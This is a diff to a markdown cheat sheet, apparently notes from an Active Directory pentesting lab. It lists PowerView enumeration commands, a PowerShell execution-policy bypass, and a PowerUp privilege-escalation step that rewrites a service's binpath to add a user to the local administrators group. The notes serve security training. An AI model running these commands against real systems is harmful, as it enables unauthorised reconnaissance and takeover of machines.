@@ -150,69 +150,69 @@ Command to scan for open TCP ports on powershell.
 **Link**: [https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/)
 
 ```bash
-**net user** - Query local users present on the system
-**net user /domain** - Query users present in a particular domain
+net user - Query local users present on the system
+net user /domain - Query users present in a particular domain
 
 POWERSHELL
 Bypass powershell restriction to run powershell scripts using "powershell -ep bypass"
-**Import-Module** <script.ps1> or . .\<script.ps1> to execute powershell script.
+Import-Module <script.ps1> or . .\<script.ps1> to execute powershell script.
 
-**PowerView**
+PowerView
 Download Powerview which contains number of scripts to enumerate the domain e.g "Get-NetUser"
-**Get-NetUser** - This can be ran on a compromised windows machine within the AD Environment
+Get-NetUser - This can be ran on a compromised windows machine within the AD Environment
 to get information about the user.
 
-**Get-NetUser** | Select-Object **givenname** - To see information for only the variable **givenname**.
+Get-NetUser | Select-Object givenname - To see information for only the variable givenname.
 - givenname - Shows all users present in a domain.
-**Get-Domain -Verbos**e - Shows information about the domain
-**Get-DomainController**- Gets information about the domain controller
-**Get-DomainSID -Verbose** - Gets security identifier of the domains
-**Get-DomainSID -Domain labs.corp -Verbose** - This gets the SID of the labs.corp domain.
+Get-Domain -Verbose - Shows information about the domain
+Get-DomainController- Gets information about the domain controller
+Get-DomainSID -Verbose - Gets security identifier of the domains
+Get-DomainSID -Domain labs.corp -Verbose - This gets the SID of the labs.corp domain.
 
-**Get-NetComputer -Verbose** - List all computers in that domain
-**Get-NetGroup -Verbose** - List all groups in the domain.
-**Get-NetGroup | Select-Object samaccountname - See all samaccountnames(groups) in that domain.
-Get-NetGroupMember -Identity "Group name" -Verbose - To get all members in a particular domain group**
-**Get-DomainTrust -Verbose  -** Shows the trusted domains in a forest
-**Get-DomainTrust -Domain labs.corp -Verbose** - Shows the trusted domains and forest of labs.corp
-**Find-LocalAdminAccess -Verbose -** Finds a computer session where current user has local
-****admin access.
+Get-NetComputer -Verbose - List all computers in that domain
+Get-NetGroup -Verbose - List all groups in the domain.
+Get-NetGroup | Select-Object samaccountname - See all samaccountnames(groups) in that domain.
+Get-NetGroupMember -Identity "Group name" -Verbose - To get all members in a particular domain group
+Get-DomainTrust -Verbose  - Shows the trusted domains in a forest
+Get-DomainTrust -Domain labs.corp -Verbose - Shows the trusted domains and forest of labs.corp
+Find-LocalAdminAccess -Verbose - Finds a computer session where current user has local
+admin access.
 
-**Invoke-ACLScanner -ResolveGUIDS -Verbose** 
-- **Invoke-ACLScanner:** Initiates an ACL scan. 
-- **ResolveGUIDS**: Resolves GUIDs to readable names.
-**- Verbose:** Displays detailed information during the execution.
-
+Invoke-ACLScanner -ResolveGUIDS -Verbose 
+- Invoke-ACLScanner: Initiates an ACL scan. 
+- ResolveGUIDS: Resolves GUIDs to readable names.
+- Verbose: Displays detailed information during the execution.
 ```
-
-**Restriction:** Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
-
 ## Local Privilege Escalation
 
+```bash
 **Powerup** can be used to escalate privileges locally within a windows environment.
 
 When a **service** is created whose **executable path** contains ***spaces*** and isn’t enclosed within ***quotes***, leads to a vulnerability known as Unquoted Service Path which allows a user to gain **SYSTEM** privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is).
 
 ```bash
-**Get-ModifiableService** - To find misconfigured services a user or administrator can be 
+Get-ModifiableService - To find misconfigured services a user or administrator can be 
 running so as to exploit it and use it to gain higher level privilege.
 Make use of the "Abusefunction" associated with the discovered service to exploit it.
 
-**Invoke-AllChecks -Verbose** runs various security checks to identify potential 
+Invoke-AllChecks -Verbose runs various security checks to identify potential 
 vulnerabilities, misconfigurations, or weaknesses within the target system.
 
-**net localgroup "administrators" -** Check list of users in the administrators group.
-**sc.exe qc** "Service Name" -  Gives Information about this service.
+net localgroup "administrators" - Check list of users in the administrators group.
+sc.exe qc "Service Name" -  Gives Information about this service.
 
 Change binary Path of the service to a command that adds a local user to the administrator's
-group with **sc.exe config "Service Name" binpath="net localgroup administrators cyberwarfare\employee
+group with sc.exe config "Service Name" binpath="net localgroup administrators cyberwarfare\employee
  /add."
  
- Restart-Service "ServiceName" -Verbose. Next, check if youre a local admin**
+ Restart-Service "ServiceName" -Verbose. Next, check if youre a local admin
+
 
 ```
 
 ## Find WMILocalAdministrator.ps1
+
+```bash
 
 **Invoke-AllChecks -Verbose**  script runs several security checks, which might include things like finding clear-text passwords in memory, identifying weak or insecure configurations, testing for privilege escalation paths, and more.
 
